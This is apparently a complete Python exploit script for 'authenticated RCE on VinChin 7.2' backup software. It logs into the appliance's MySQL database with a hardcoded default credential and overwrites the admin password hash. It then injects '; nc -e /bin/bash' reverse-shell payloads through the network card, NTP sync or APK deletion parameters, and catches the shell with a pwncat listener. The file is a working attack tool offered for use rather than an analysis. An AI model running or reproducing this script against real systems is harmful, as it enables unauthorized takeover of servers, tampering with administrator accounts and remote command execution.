import sys
import time
import json
import random
import string
import socket
import hashlib
import requests
import argparse
import threading
import pwncat.manager
import mysql.connector

from selenium import webdriver
from rich.console import Console
from urllib.parse import urlparse
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC
from requests.packages.urllib3.exceptions import InsecureRequestWarning


class VinchinRCE:
    def __init__(
        self,
        url: str,
        username: str,
        password: str,
        rshell_ip: str,
        rshell_port: str,
        payload_type: str,
    ):
        self.url = url
        self.username = username
        self.password = password
        self.rshell_ip = rshell_ip
        self.rshell_port = rshell_port
        self.payload_type = payload_type
        self.revshell_connected = False

        self.db_user = "vinchin"
        self.db_password = "yunqi123456"
        self.db_name = "vinchin_db"

        self.console = Console()
        self.driver = self.setup_driver()
        self.payload = f"; nc -e /bin/bash {self.rshell_ip} {self.rshell_port}"

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def check_revshell_connection(self, timeout=15):
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.revshell_connected:
                return
            time.sleep(1)
        self.custom_print(f"Reverse shell did not connect within {timeout} seconds.", "-")
        sys.exit(1)

    def change_db_password(self) -> None:
        parsed_url = urlparse(self.url)
        self.db_host = parsed_url.hostname

        new_password = "".join(
            random.choices(string.ascii_letters + string.digits, k=10)
        )
        new_hash = hashlib.md5(new_password.encode()).hexdigest()
        original_hash = None
        password_changed = False

        try:
            connection = mysql.connector.connect(
                host=self.db_host,
                user=self.db_user,
                password=self.db_password,
                database=self.db_name,
            )
            cursor = connection.cursor()

            cursor.execute("SELECT password FROM bd_user WHERE user_name = 'admin'")
            result = cursor.fetchone()
            original_hash = result[0] if result else None

            cursor.execute(
                "UPDATE bd_user SET password = %s WHERE user_name = 'admin'",
                (new_hash,),
            )
            connection.commit()
            password_changed = True

            self.custom_print(
                f"Password for user 'admin' changed to {new_password}.", "+"
            )
            self.password = new_password
            self.old_password = original_hash
            self.login()

        except mysql.connector.Error as error:
            self.custom_print(
                f"Failed to connect or operate on the database: {error}", "-"
            )
            if original_hash and not password_changed:
                self.custom_print(
                    "Attempting to log in with the original password for user 'admin'.",
                    "!",
                )
                self.password = original_hash
                self.login()

    def restore_original_password(self):
        try:
            connection = mysql.connector.connect(
                host=self.db_host,
                user=self.db_user,
                password=self.db_password,
                database=self.db_name,
            )
            cursor = connection.cursor()
            cursor.execute(
                "UPDATE bd_user SET password = %s WHERE user_name = 'admin'",
                (self.old_password,),
            )
            connection.commit()
            self.custom_print("Restored the original password for user 'admin'.", "+")
        except mysql.connector.Error as error:
            self.custom_print(f"Failed to restore the original password: {error}", "-")
        finally:
            if connection and connection.is_connected():
                cursor.close()
                connection.close()

    def setup_driver(self) -> webdriver.Chrome:
        user_agent = UserAgent().random
        self.custom_print("Initializing WebDriver...", "*")

        self.custom_print("Configuring Chrome options...", "*")
        options = Options()
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--headless")
        options.add_argument(f"user-agent={user_agent}")

        self.custom_print("Setting up WebDriver service...", "*")
        service = Service(ChromeDriverManager().install())

        self.custom_print("Launching Chrome browser...", "*")
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_window_size(1366, 768)

        return driver

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors[header]}][{header}][/bold {header_colors[header]}] {message}"
        )

    def start_listener(self) -> None:
        with socket.create_server((self.rshell_ip, int(self.rshell_port))) as listener:
            self.custom_print(
                f"Waiting for incoming connection on port {self.rshell_port}...", "*"
            )
            victim, victim_addr = listener.accept()
            self.revshell_connected = True
            self.custom_print(
                f"Received connection from {victim_addr[0]}:{victim_addr[1]}", "+"
            )

            with pwncat.manager.Manager() as manager:
                manager.create_session(
                    platform="linux", protocol="socket", client=victim
                )
                self.custom_print("Dropping to pwncat prompt...", "+")
                manager.interactive()

    def login(self) -> None:
        self.custom_print(f"Accessing the URL: {self.url}...", "*")
        self.driver.get(self.url)

        try:
            self.custom_print("Waiting for the username input field...", "*")
            username_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )

            self.custom_print("Waiting for the password input field...", "*")
            password_input = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )

            self.custom_print("Waiting for the submit button...", "*")
            submit_button = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.ID, "login-btn"))
            )

            self.custom_print("Sending username and password...", "*")

            username_input.send_keys(self.username)
            password_input.send_keys(self.password)

            self.custom_print("Submitting the form...", "*")

            submit_button.click()
            time.sleep(2)
            page_content = self.driver.page_source

            if "invalid" in page_content.lower():
                self.custom_print(
                    "Login failed. CAPTCHA detected or wrong credentials.", "-"
                )
                sys.exit(1)

            elif "incorrect" in page_content.lower():
                self.custom_print("Login failed, wrong credentials", "-")
                sys.exit(1)

            else:
                self.custom_print("Logged In!", "+")
                self.restore_original_password() if self.old_password else None

                self.custom_print(
                    f"Using {self.payload_type} exploitation method !", "+"
                )
                match self.payload_type:
                    case "setNetworkCardInfo":
                        self.setNetworkCardInfo()
                    case "syncNtpTime":
                        self.syncNtpTime()
                    case "deleteUpdateAPK":
                        self.deleteUpdateAPK()

        except Exception as e:
            self.custom_print(f"An error occurred: {e}", "-")

    def send_http_request(self, function_name: str, params: dict) -> None:
        cookies = self.driver.get_cookies()
        session = requests.Session()
        cookie_dict = {cookie["name"]: cookie["value"] for cookie in cookies}

        data = {"m": "8", "f": function_name, "p": json.dumps(params)}

        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
            "Origin": self.url,
        }

        threading.Thread(target=self.check_revshell_connection).start()
        try:
            session.post(
                f"{self.url}/api/",
                headers=headers,
                cookies=cookie_dict,
                data=data,
                verify=False,
                timeout=5,
            )

        except requests.exceptions.Timeout:
            pass
        
        except requests.exceptions.RequestException as e:
            self.custom_print(f"An error occurred: {e}", "-")

    def setNetworkCardInfo(self) -> None:
        self.custom_print("Navigating to system management...", "*")
        system_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "sysmanagement"))
        )
        system_link.click()

        self.custom_print("Navigating to setting manager...", "*")
        setting_manager_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable((By.NAME, "setting_manager"))
        )
        setting_manager_link.click()

        self.custom_print("Navigating to network settings...", "*")
        network_settings_link = WebDriverWait(self.driver, 10).until(
            EC.element_to_be_clickable(
                (By.XPATH, "//a[contains(@href, 'system_network.php')]")
            )
        )
        network_settings_link.click()

        self.custom_print(
            f"Injecting payload for reverse shell: {self.rshell_ip}:{self.rshell_port}...",
            "*",
        )
        networkcard_option = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located(
                (By.XPATH, "//select[@name='networkcard']/option")
            )
        )
        self.driver.execute_script(
            "arguments[0].innerText = arguments[1]", networkcard_option, self.payload
        )

        self.custom_print("Submitting the network settings form...", "*")
        ok_button = WebDriverWait(self.driver, 15).until(
            EC.element_to_be_clickable((By.ID, "ipsubmit"))
        )

        threading.Thread(target=self.check_revshell_connection).start()
        ok_button.click()

        self.custom_print("Check your listener h4x0rm4n...", "+")

    def syncNtpTime(self) -> None:
        params = {"ntphost": f"time.nist.gov {self.payload}"}
        self.send_http_request("syncNtpTime", params)

    def deleteUpdateAPK(self) -> None:
        params = {"md5": "h4x0rm4n", "file_name": self.payload}
        self.send_http_request("deleteUpdateAPK", params)


def main() -> None:
    parser = argparse.ArgumentParser(description="Authenticated RCE on VinChin 7.2.")
    parser.add_argument(
        "-u",
        "--url",
        default="https://192.168.1.7",
        help="URL of the login page",
    )
    parser.add_argument(
        "-user", "--username", default="admin", help="Username for login"
    )
    parser.add_argument(
        "-p", "--password", default="123456", help="Password for login"
    )    
    parser.add_argument(
        "-rip", "--rshell_ip", default="192.168.1.5", help="Reverse shell IP address"
    )
    parser.add_argument(
        "-rport", "--rshell_port", default="1338", help="Reverse shell port"
    )
    parser.add_argument(
        "--payload_type",
        default="syncNtpTime",
        choices=["setNetworkCardInfo", "syncNtpTime", "deleteUpdateAPK"],
        help="Type of payload to send",
    )

    args = parser.parse_args()

    vinchin_rce = VinchinRCE(
        args.url,
        args.username,
        args.password,
        args.rshell_ip,
        args.rshell_port,
        args.payload_type,
    )

    listener_thread = threading.Thread(target=vinchin_rce.start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    
    vinchin_rce.change_db_password()
    listener_thread.join()


if __name__ == "__main__":
    main()
